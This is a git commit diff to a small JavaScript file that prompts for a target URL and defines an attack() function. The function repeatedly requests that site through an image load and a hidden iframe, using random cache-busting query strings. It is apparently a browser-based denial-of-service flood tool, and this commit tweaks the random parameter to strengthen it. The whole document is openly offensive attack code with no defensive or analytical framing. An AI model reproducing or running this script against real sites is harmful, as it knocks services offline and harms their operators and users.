93c1f5d8a2662064b14b2c08baf6c7aa3b207f60
ninja25538 <ninja25538@users.noreply.github.com>
2017-08-09 12:35:10 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,8 +1,8 @@
 var target = prompt("Url");
 function attack() {  
   var pic = new Image();
-  var rand = Math.floor(Math.random() * 1000);
-  pic.src = 'http://'+target+"/?"+rand;
+  var rand = Math.floor(Math.random() * 9999999999999999999);
+  pic.src = 'http://'+target+"/?r="+rand;
     
     document.body.innerHTML+='<iframe src="'+target+"/?r="+rand+'" style="display:none;"></iframe>';
 }
